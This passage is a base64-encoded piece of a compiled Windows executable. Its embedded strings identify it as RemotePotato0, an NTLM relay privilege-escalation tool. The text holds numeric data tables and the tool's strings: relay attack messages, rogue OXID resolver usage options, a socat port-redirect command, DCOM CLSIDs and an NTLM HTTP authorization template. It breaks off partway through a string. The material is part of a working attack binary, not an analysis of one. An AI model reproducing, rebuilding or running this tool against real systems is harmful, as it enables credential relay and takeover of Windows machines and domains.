ECS1BDxBL5yZBgMwTaH+6t4FCmvUfw5l+slFTArTAsOA6E7PP4ouvyId1hDnrik5D1zwvJGfJhidI8PIRnbrrajLrIUUKqNqznqQjSWl6nf3wH+0/PSgAJ5oDcAAAABm5xQ8a3cxyytPTg3TcZz0Gdt6gaom1H48gPEouFSoDojENepc4VEutkSzwMYh3CbOtxS6FKy5U77Fwcvpk2+4derCk/tYox77LnOIUBm1ACDFaHmdePM8ikvhIEAAAAA5Bd3ZPv103E9dqDpLxR9Zkz0My7xuPOODQ8TaZRMc6gPJmBAEwE8CohxzCEtpTfvydqKtDG7QkFM+dZsBYvIuAEF4nztl1LEYcNiqtjah97qM7hhaPCUvZrME2rVwY0tAQAAAAAQE+g2esaeKRb0Cj9J88+mpXejI76kgluizC9yEDV/RJ2+uBPCqE4yTMmtM568uv6sdjIhTC4yzRM+tJH+cDbZXLuFlxRC/RrMRvjdOObShwdpF9ECGv7xtT6uq7nDb+4IHL4CAAAAAABAqsJAgdl3+Cw91+FxmC/n1QljUXLdGaivRloq1s7cAir+3UbOjSQTJ63SI7cZuwTEK8wGt8rrsUfcSwmdygLcxY5R5jGAVsOOqFgvNEIeBIsU5b/+E/z/BQ95Y2f9NtVmdlDhuWIGAAAAYbBnGgoB0sDhBdA7cxLbPy6fo+KdsmHi3GMqvAQmlJvVcGGWJePCuXULFCEsHR9gahO4ojvSiXN98WDf18rGK99pBjeHuCTtBpNm625JGW/bjZN1gnReNppuxTG3kDbFQijIjnmuJN4OAAAAAGRBwZqI1ZksQ9ka54CiLj32az15SYJDqed5Sub9Ippw1uDvz8oF16SNvWwAZOOz3E6lbgiooZ5Fj3TIVI78V8Z0zNTDuEJuY9lXzFu1Nen+E2xhUcQa27qVtZ1O8aFQ5/nccX9jByufL96dIgAAAAAAEIm9XjxWN3fjOKPLPU+e0oEsnvekdMf5w5fnHGo45F+snIvzB/rsiNWswVo+zsyvhXA/H53TbS3oDBh9F2+UaV7hLI5kSDmhlRHgDzRYPBe0lPZIJ71XJnwu2ot1oJCAOxO22y2QSM9tfgTkJJlQAAAAAAAAAAAAAAAAAAICAAADBQAABAkAAQQNAAEFEgABBhgAAgYeAAIHJQACCC0AAwg1AAMJPgADCkgABApSAAQLXQAEDGkABQx1AAUNggAFDpAABQ+fAAYPrgAGEL4ABhHPAAcR4AAHEvIABxMFAQgTGAEIFS0BCBZDAQkWWQEJF3ABCRiIAQoYoAEKGbkBChrTAQob7gELGwkCCxwlAgsdCgAAAGQAAADoAwAAECcAAKCGAQBAQg8AgJaYAADh9QUAypo7MAAAADEjSU5GAAAAMSNRTkFOAAAxI1NOQU4AADEjSU5EAAAAAAAAAAAA8D8AAAAAAAAAAAAAAAAAAPD/AAAAAAAAAAAAAAAAAADwfwAAAAAAAAAAAAAAAAAA+P8AAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAD/AwAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAP///////w8AAAAAAAAAAAAAAAAAAPAPAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAA7lJhV7y9s/AAAAAAAAAAAAAAAAeMvbPwAAAAAAAAAANZVxKDepqD4AAAAAAAAAAAAAAFATRNM/AAAAAAAAAAAlPmLeP+8DPgAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAPA/AAAAAAAAAAAAAAAAAADgPwAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAGA/AAAAAAAAAAAAAAAAAADgPwAAAAAAAAAAVVVVVVVV1T8AAAAAAAAAAAAAAAAAANA/AAAAAAAAAACamZmZmZnJPwAAAAAAAAAAVVVVVVVVxT8AAAAAAAAAAAAAAAAA+I/AAAAAAAAAAAD9BwAAAAAAAAAAAAAAAAAAAAAAAAAAsD8AAAAAAAAAAAAAAAAAAO4/AAAAAAAAAAAAAAAAAADxPwAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAP////////9/AAAAAAAAAADmVFVVVVW1PwAAAAAAAAAA1Ma6mZmZiT8AAAAAAAAAAJ9R8QcjSWI/AAAAAAAAAADw/13INIA8PwAAAAAAAAAAAAAAAP////8AAAAAAAAAAAEAAAACAAAAAwAAAAAAAABDAE8ATgBPAFUAVAAkAAAAAAAAAAAAAAAAAACQnr1bPwAAAHDUr2s/AAAAYJW5dD8AAACgdpR7PwAAAKBNNIE/AAAAUAibhD8AAADAcf6HPwAAAICQXos/AAAA8Gq7jj8AAACggwqRPwAAAOC1tZI/AAAAUE9flD8AAAAAUweWPwAAANDDrZc/AAAA8KRSmT8AAAAg+fWaPwAAAHDDl5w/AAAAoAY4nj8AAACwxdafPwAAAKABuqA/AAAAIOGHoT8AAADAAlWiPwAAAMBnIaM/AAAAkBHtoz8AAACAAbikPwAAAOA4gqU/AAAAELlLpj8AAABAgxSnPwAAAMCY3Kc/AAAA0PqjqD8AAADAqmqpPwAAANCpMKo/AAAAIPn1qj8AAAAAmrqrPwAAAJCNfqw/AAAAENVBrT8AAACgcQSuPwAAAHBkxq4/AAAAsK6Hrz8AAADAKCSwPwAAAPAmhLA/AAAAkNLjsD8AAAAwLEOxPwAAAEA0orE/AAAAYOsAsj8AAAAQUl+yPwAAAOBovbI/AAAAUDAbsz8AAADgqHizPwAAADDT1bM/AAAAoK8ytD8AAADQPo+0PwAAACCB67Q/AAAAMHdHtT8AAABgIaO1PwAAAECA/rU/AAAAQJRZtj8AAADwXbS2PwAAALDdDrc/AAAAABRptz8AAABgAcO3PwAAADCmHLg/AAAAAAN2uD8AAAAwGM+4PwAAAEDmJ7k/AAAAkG2AuT8AAACgrti5PwAAANCpMLo/AAAAoF+Iuj8AAABw0N+6PwAAALD8Nrs/AAAA0OSNuz8AAAAwieS7PwAAAEDqOrw/AAAAcAiRvD8AAAAQ5Oa8PwAAAKB9PL0/AAAAgNWRvT8AAAAA7Oa9PwAAAKDBO74/AAAAsFaQvj8AAACgq+S+PwAAAMDAOL8/AAAAgJaMvz8AAAAwLeC/PwAAAKDCGcA/AAAAcE9DwD8AAABgvWzAPwAAAIAMlsA/AAAAAD2/wD8AAAAQT+jAPwAAAPBCEcE/AAAAoBg6wT8AAACA0GLBPwAAAJBqi8E/AAAAEOezwT8AAAAwRtzBPwAAABCIBMI/AAAA4Kwswj8AAADQtFTCPwAAAPCffMI/AAAAgG6kwj8AAACwIMzCPwAAAJC288I/AAAAUDAbwz8AAAAgjkLDPwAAACDQacM/AAAAgPaQwz8AAABgAbjDPwAAAODw3sM/AAAAMMUFxD8AAABwfizEPwAAANAcU8Q/AAAAcKB5xD8AAABwCaDEPwAAAABYxsQ/AAAAMIzsxD8AAABAphLFPwAAADCmOMU/AAAAUIxexT8AAACQWITFPwAAAEALqsU/AAAAcKTPxT8AAABAJPXFPwAAANCKGsY/AAAAUNg/xj8AAADQDGXGPwAAAIAoisY/AAAAgCuvxj8AAADgFdTGPwAAANDn+MY/AAAAcKEdxz8AAADgQkLHPwAAAEDMZsc/AAAAoD2Lxz8AAAAwl6/HPwAAABDZ08c/AAAAUAP4xz8AAAAgFhzIPwAAAJARQMg/AAAAwPVjyD8AAADgwofIPwAAAAB5q8g/AAAAMBjPyD8AAACgoPLIPwAAAHASFsk/AAAAsG05yT8AAACAslzJPwAAAADhf8k/AAAAUPmiyT8AAABw+8XJPwAAALDn6Mk/AAAA8L0Lyj8AAACAfi7KPwAAAGApUco/AAAAoL5zyj8AAABwPpbKPwAAAPCouMo/AAAAIP7ayj8AAAAwPv3KPwAAADBpH8s/AAAAQH9Byz8AAABwgGPLPwAAAPBshcs/AAAAsESnyz8AAADwB8nLPwAAAMC26ss/AAAAMFEMzD8AAABQ1y3MPwAAAFBJT8w/AAAAQKdwzD8AAAAw8ZHMPwAAAEAns8w/AAAAgEnUzD8AAAAQWPXMPwAAAABTFs0/AAAAYDo3zT8AAABgDljNPwAAAADPeM0/AAAAcHyZzT8AAACgFrrNPwAAANCd2s0/AAAA8BH7zT8AAAAwcxvOPwAAAKDBO84/AAAAUP1bzj8AAABgJnzOPwAAAOA8nM4/AAAA4EC8zj8AAACAMtzOPwAAANAR/M4/AAAA4N4bzz8AAADQmTvPPwAAAKBCW88/AAAAgNl6zz8AAABwXprPPwAAAJDRuc8/AAAA8DLZzz8AAACggvjPPwAAAFDgC9A/AAAAoHYb0D8AAAAwBCvQPwAAABCJOtA/AAAAQAVK0D8AAADgeFnQPwAAAPDjaNA/AAAAcEZ40D8AAACAoIfQPwAAABDyltA/AAAAMDum0D8AAADwe7XQPwAAAFC0xNA/AAAAYOTT0D8AAAAwDOPQPwAAAMAr8tA/AAAAEEMB0T8AAABAUhDRPwAAAEBZH9E/AAAAMFgu0T8AAAAATz3RPwAAANA9TNE/AAAAoCRb0T8AAABwA2rRPwAAAFDaeNE/AAAAQKmH0T8AAABgcJbRPwAAAKAvpdE/AAAAEOez0T8AAADAlsLRPwAAALA+0dE/AAAA8N7f0T8AAABwd+7RPwAAAGAI/dE/AAAAoJEL0j8AAABQExrSPwAAAHCNKNI/AAAAEAA30j8AAAAwa0XSPwAAANDOU9I/AAAAACti0j8AAADQf3DSPwAAAEDNftI/AAAAYBON0j8AAAAgUpvSPwAAAKCJqdI/AAAA4Lm30j8AAADg4sXSPwAAALAE1NI/AAAAUB/i0j8AAADAMvDSPwAAACA//tI/AAAAcEQM0z8AAACwQhrTPwAAAOA5KNM/AAAAECo20z8AAABQE0TTPwAAAAAAAAAAAAAAAAAAAACPILIivAqyPdQNLjNpD7E9V9J+6A2Vzj1pbWI7RPPTPVc+NqXqWvQ9C7/hPGhDxD0RpcZgzYn5PZ8uHyBvYv09zb3auItP6T0VMELv2IgAPq15K6YTBAg+xNPuwBeXBT4CSdStd0qtPQ4wN/A/dg4+w/YGR9di4T0UvE0fzAEGPr/l9lHg8+o96/MaHgt6CT7HAsBwiaPAPVHHVwAALhA+Dm7N7gBbFT6vtQNwKYbfPW2jNrO5VxA+T+oGSshLEz6tvKGe2kMWPirq97SnZh0+7/z3OOCy9j2I8HDGVOnzPbPKOgkJcgQ+p10n549wHT7nuXF3nt8fPmAGCqe/Jwg+FLxNH8wBFj5bXmoQ9jcGPktifPETahI+OmKAzrI+CT7elBXp0TAUPjGgjxAQax0+QfK6C5yHFj4rvKZeAQj/PWxnxs09tik+LKvEvCwCKz5EZd190Bf5PZ43A1dgQBU+YBt6lIvRDD5+qXwnZa0XPqlfn8VNiBE+gtAGYMQRFz74CDE8LgkvPjrhK+PFFBc+mk9z/ae7Jj6DhOC1j/T9PZULTcebLyM+Ewx5SOhz+T1uWMYIvMwePphKUvnpFSE+uDExWUAXLz41OGQli88bPoDtix2oXx8+5Nkp+U1KJD6UDCLYIJgSPgnjBJNICyo+/mWmq1ZNHz5jUTYZkAwhPjYnWf54D/g9yhzIJYhSED5qdG19U5XgPWAGCqe/Jxg+PJNF7KiwBj6p2/Ub+FoQPhXVVSb64hc+v+Suv+xZDT6jP2jaL4sdPjc3Ov3duCQ+BBKuYX6CEz6fD+lJe4wsPh1ZlxXw6ik+NnsxbqaqGT5VBnIJVnIuPlSsevwzHCY+UqJhzytmKT4wJ8QRyEMYPjbLWgu7ZCA+pAEnhAw0Cj7WeY+1VY4aPpqdXpwhLek9av1/DeZjPz4UY1HZDpsuPgw1YhmQIyk+gV54OIhvMj6vpqtMals7Phx2jtxqIvA97Ro6MddKPD4XjXN86GQVPhhmivHsjzM+ZnZ39Z6SPT64oI3wO0g5PiZYqu4O3Ts+ujcCWd3EOT7Hyuvg6fMaPqwNJ4JTzjU+urkqU3RPOT5UhoiVJzQHPvBL4wsAWgw+gtAGYMQRJz74jO20JQAlPqDS8s6L0S4+VHUKDC4oIT7Kp1kz83ANPiVAqBN+fys+Hokhw24wMz5QdYsD+Mc/PmQd14w1sD4+dJSFIsh2Oj7jht5Sxg49Pq9YhuDMpC8+ngrA0qKEOz7RW8LysKUgPpn2WyJg1j0+N/CbhQ+xCD7hy5C1I4g+PvaWHvMREzY+mg+iXIcfLj6luTlJcpUsPuJYPnqVBTg+NAOf6ibxLz4JVo5Z9VM5PkjEVvhvwTY+9GHyDyLLJD6iUz3VIOE1PlbyiWF/Ujo+D5zU//xWOD7a1yiCLgwwPuDfRJTQE/E9plnqDmMQJT4R1zIPeC4mPs/4EBrZPu09hc1LfkplIz4hrYBJeFsFPmRusdQtLyE+DPU52a3ENz78gHFihBcoPmFJ4cdiUeo9Y1E2GZAMMT6IdqErTTw3PoE96eCl6Co+ryEW8MawKj5mW910ix4wPpRUu+xvIC0+AMxPcou08D0p4mELH4M/Pq+8B8SXGvg9qrfLHGwoPj6TCiJJC2MoPlwsosEVC/89Rgkc50VUNT6FbQb4MOY7Pjls2fDfmSU+gbCPsYXMNj7IqB4AbUc0Ph/TFp6IPzc+hyp5DRBXMz72AWGuedE7PuL2w1YQoww++wicYnAoPT4/Z9KAOLo6PqZ9KcszNiw+AurvmTiEIT7mCCCdycw7PlDTvUQFADg+4WpgJsKRKz7fK7Ym33oqPslugshPdhg+8GgP5T1PHz7jlXl1ymD3PUdRgNN+Zvw9b99qGfYzNz5rgz7zELcvPhMQZLpuiDk+Goyv0GhT+z1xKY0baYw1PvsIbSJllP49lwA/Bn5YMz4YnxIC5xg2PlSsevwzHDY+SmAIhKYHPz4hVJTkvzQ8PgswQQ7wsTg+YxvWhEJDPz42dDleCWM6Pt4ZuVaGQjQ+ptmyAZLKNj4ckyo6gjgnPjCSFw6IETw+/lJtjdw9MT4X6SKJ1e4zPlDda4SSWSk+iycuX03bDT7ENQYq8aXxPTQ8LIjwQkY+Xkf2p5vuKj7kYEqDf0smPi55Q+JCDSk+AU8TCCAnTD5bz9YWLnhKPkhm2nlcUEQ+Ic1N6tSpTD681XxiPX0pPhOqvPlcsSA+3XbPYyBbMT5IJ6rz5oMpPpTp//RkTD8+D1rofLq+Rj64pk79aZw7PqukX4Olais+0e0PecPMQz7gT0DETMApPp3YdXpLc0A+EhbgxAREGz6USM7CZcVAPs012UEUxzM+TjtrVZKkcj1D3EEDCfogPvTZ4wlwjy4+RYoEi/YbSz5WqfrfUu4+Pr1l5AAJa0U+ZnZ39Z6STT5g4jeGom5IPvCiDPGvZUY+dOxIr/0RLz7H0aSGG75MPmV2qP5bsCU+HUoaCsLOQT6fm0AKX81BPnBQJshWNkU+YCIoNdh+Nz7SuUAwvBckPvLveXvvjkA+6VfcOW/HTT5X9AynkwRMPgympc7Wg0o+ulfFDXDWMD4KvegSbMlEPhUj45MZLD0+QoJfEyHHIj59dNpNPponPiunQWmf+Pw9MQjxAqdJIT7bdYF8S61OPgrnY/4waU4+L+7ZvgbhQT6SHPGCK2gtPnyk24jxBzo+9nLBLTT5QD4lPmLeP+8DPgAAAAAAAAAAAAAAAAAAAEAg4B/gH+D/P/AH/AF/wP8/EvoBqhyh/z8g+IEf+IH/P7XboKwQY/8/cUJKnmVE/z+1CiNE9iX/PwgffPDBB/8/Ao5F+Mfp/j/A7AGzB8z+P+sBunqArv4/Z7fwqzGR/j/kUJelGnT+P3TlAck6V/4/cxrceZE6/j8eHh4eHh7+Px7gAR7gAf4/iob449bl/T/KHaDcAcr9P9uBuXZgrv0/in8eI/KS/T80LLhUtnf9P7JydYCsXP0/HdRBHdRB/T8aW/yjLCf9P3TAbo+1DP0/xr9EXG7y/D8LmwOJVtj8P+fLAZZtvvw/keFeBbOk/D9CivtaJov8PxzHcRzHcfw/hkkN0ZRY/D/w+MMBjz/8PxygLjm1Jvw/4MCBAwcO/D+LjYbug/X7P/cGlIkr3fs/ez6IZf3E+z/QusEU+az7PyP/GCselfs/izPaPWx9+z8F7r7j4mX7P08b6LSBTvs/zgbYSkg3+z/ZgGxANiD7P6Qi2TFLCfs/KK+hvIby+j9ekJR/6Nv6PxtwxRpwxfo//euHLx2v+j++Y2pg75j6P1nhMFHmgvo/bRrQpgFt+j9KimgHQVf6PxqkQRqkQfo/oBzFhyos+j8CS3r50xb6PxqgARqgAfo/2TMQlY7s+T8taGsXn9f5PwKh5E7Rwvk/2hBV6iSu+T+amZmZmZn5P//Ajg0vhfk/crgM+ORw+T+ud+MLu1z5P+Dp1vywSPk/5iybf8Y0+T8p4tBJ+yD5P9WQARJPDfk/+hicj8H5+D8/N/F6Uub4P9MYMI0B0/g/Ov9igM6/+D+q82sPuaz4P5yJAfbAmfg/SrCr8OWG+D+5ksC8J3T4PxiGYRiGYfg/FAZ4wgBP+D/dvrJ6lzz4P6CkggFKKvg/GBgYGBgY+D8GGGCAAQb4P0B/Af0F9Pc/HU9aUSXi9z/0BX1BX9D3P3wBLpKzvvc/w+zgCCKt9z+LObZrqpv3P8ikeIFMivc/DcaaEQh59z+xqTTk3Gf3P211AcLKVvc/RhdddNFF9z+N/kHF8DT3P7zeRn8oJPc/CXycbXgT9z9wgQtc4AL3Pxdg8hZg8vY/xzdDa/fh9j9hyIEmptH2PxdswRZswfY/PRqjCkmx9j+QclPRPKH2P8DQiDpHkfY/F2iBFmiB9j8aZwE2n3H2P/kiUWrsYfY/o0o7hU9S9j9kIQtZyEL2P97AirhWM/Y/QGIBd/oj9j+UrjFosxT2PwYWWGCBBfY//C0pNGT29T/nFdC4W+f1P6Xi7MNn2PU/VxCTK4jJ9T+R+kfGvLr1P8BaAWsFrPU/qswj8WGd9T/tWIEw0o71P2AFWAFWgPU/OmtQPO1x9T/iUny6l2P1P1VVVVVVVfU//oK75iVH9T/rD/RICTn1P0sFqFb/KvU/Ffji6gcd9T/FxBHhIg/1PxVQARVQAfU/m0zdYo/z9D85BS+n4OX0P0ws3L5D2PQ/bq8lh7jK9D/hj6bdPr30P1u/UqDWr/Q/SgF2rX+i9D9n0LLjOZX0P4BIASIFiPQ/exSuR+F69D9mYFk0zm30P5rP9cfLYPQ/ynbH4tlT9D/72WJl+Eb0P03uqzAnOvQ/hx/VJWYt9D9RWV4mtSD0PxQUFBQUFPQ/ZmUO0YIH9D/7E7A/AfvzPwevpUKP7vM/AqnkvCzi8z/GdaqR2dXzP+ere6SVyfM/VSkj2WC98z8UO7ETO7HzPyLIejgkpfM/Y38YLByZ8z+OCGbTIo3zPxQ4gRM4gfM/7kXJ0Vt18z9IB97zjWnzP/gqn1/OXfM/wXgr+xxS8z9GE+CseUbzP7K8V1vkOvM/+h1q7Vwv8z+/ECtK4yPzP7br6Vh3GPM/kNEwARkN8z9gAsQqyAHzP2gvob2E9vI/S9H+oU7r8j+XgEvAJeDyP6BQLQEK1fI/oCyBTfvJ8j8RN1qO+b7yP0ArAa0EtPI/BcHzkhyp8j+eEuQpQZ7yP6UEuFtyk/I/E7CIErCI8j9NzqE4+n3yPzUngbhQc/I/JwHWfLNo8j/xkoBwIl7yP7J3kX6dU/I/kiRJkiRJ8j9bYBeXtz7yP9+8mnhWNPI/KhKgIgEq8j94+yGBtx/yP+ZVSIB5FfI/2cBnDEcL8j8SIAESIAHyP3AfwX0E9/E/TLh/PPTs8T90uD877+LxP71KLmf12PE/HYGirQbP8T9Z4Bz8IsXxPyntRkBKu/E/47ryZ3yx8T+WexphuafxP54R4BkBnvE/nKKMgFOU8T/bK5CDsIrxPxIYgREYgfE/hNYbGYp38T95c0KJBm7xPwEy/FCNZPE/DSd1Xx5b8T/J1f2juVHxPzvNCg5fSPE/JEc0jQ4/8T8RyDURyDXxP6zA7YmLLPE/MzBd51gj8T8mSKcZMBrxPxEREREREfE/gBABvvsH8T8R8P4Q8P7wP6Ils/rt9fA/kJzma/Xs8D8RYIJVBuTwP5ZGj6gg2/A/Op41VkTS8D872rxPccnwP3FBi4anwPA/yJ0l7Oa38D+17C5yL6/wP6cQaAqBpvA/YIOvptud8D9UCQE5P5XwP+JldbOrjPA/hBBCCCGE8D/i6rgpn3vwP8b3Rwomc/A/+xJ5nLVq8D/8qfHSTWLwP4Z1cqDuWfA/BDTX95dR8D/FZBbMSUnwPxAEQRAEQfA//EeCt8Y48D8aXh+1kTDwP+kpd/xkKPA/CAQCgUAg8D83elE2JBjwPxAQEBAQEPA/gAABAgQI8D8AAAAAAADwPwAAAAAAAAAAbG9nMTAAAAAAAAAAAAAAAP///////z9D////////P8NbIV0gQ291bGRuJ3QgZm9yZ2UgdGhlIGh0dHAgcGFja2V0IHdpdGggdGhlIHR5cGUgMSBhdXRoIGFuZCBzZW5kIGl0IHRvIHRoZSBodHRwIHNlcnZlci4KAAAAAAAAAABbIV0gQ291bGRuJ3QgcmVjZWl2ZSB0aGUgaHR0cCByZXNwb25zZSBmcm9tIHRoZSBodHRwIHNlcnZlcgoAAAAAWyFdIENvdWxkbid0IGNvbW11bmljYXRlIHdpdGggdGhlIGZha2UgUlBDIFNlcnZlcgoAAAAAAAAAAAAAAAAAAFshXSBDb3VsZG4ndCByZWNlaXZlIHRoZSB0eXBlMiBtZXNzYWdlIGZyb20gdGhlIGZha2UgUlBDIFNlcnZlcgoAAAAAAAAAAAAAAAAAAAAAWyFdIENvdWxkbid0IHNlbmQgdGhlIGFsdGVyZWQgdHlwZTIgdG8gdGhlIHJwYyBjbGllbnQgKHRoZSBwcml2aWxlZ2VkIGF1dGgpCgAAAABbIV0gQ291bGRuJ3QgcmVjZWl2ZSB0aGUgdHlwZTMgYXV0aCBmcm9tIHRoZSBycGMgY2xpZW50CgAAAAAAAAAAWyFdIENvdWxkbid0IHNlbmQgdGhlIHR5cGUzIEFVVEggdG8gdGhlIGh0dHAgc2VydmVyCgAAAABbIV0gQ291bGRuJ3QgcmVjZWl2ZSB0aGUgb3V0cHV0IGZyb20gdGhlIGh0dHAgc2VydmVyCgAAAFsrXSBSZWxheWluZyBzZWVtcyBzdWNjZXNzZnVsbCwgY2hlY2sgbnRsbXJlbGF5eCBvdXRwdXQhCgAAAAAAAABbIV0gUmVsYXlpbmcgZmFpbGVkIDooCgBXU0FTdGFydHVwIGZhaWxlZCB3aXRoIGVycm9yOiAlZAoAAAAAAAAAZ2V0YWRkcmluZm8gZmFpbGVkIHdpdGggZXJyb3I6ICVkCgAAAAAAAHNvY2tldCBmYWlsZWQgd2l0aCBlcnJvcjogJWxkCgAAYmluZCBmYWlsZWQgd2l0aCBlcnJvcjogJWQKAAAAAABbKl0gUlBDIHJlbGF5IHNlcnZlciBsaXN0ZW5pbmcgb24gcG9ydCAlUyAuLi4KAABsaXN0ZW4gZmFpbGVkIHdpdGggZXJyb3I6ICVkCgAAAGFjY2VwdCBmYWlsZWQgd2l0aCBlcnJvcjogJWQKAAAAAAAAAAAAAABbK10gUmVjZWl2ZWQgdGhlIHJlbGF5ZWQgYXV0aGVudGljYXRpb24gZm9yIGlSZW1Vbmtub3duMiBxdWVyeSBvbiBwb3J0ICVTCgAAAAAAAFcAUwBBAFMAdABhAHIAdAB1AHAAIABmAHUAbgBjAHQAaQBvAG4AIABmAGEAaQBsAGUAZAAgAHcAaQB0AGgAIABlAHIAcgBvAHIAOgAgACUAZAAKAAAAAAAAA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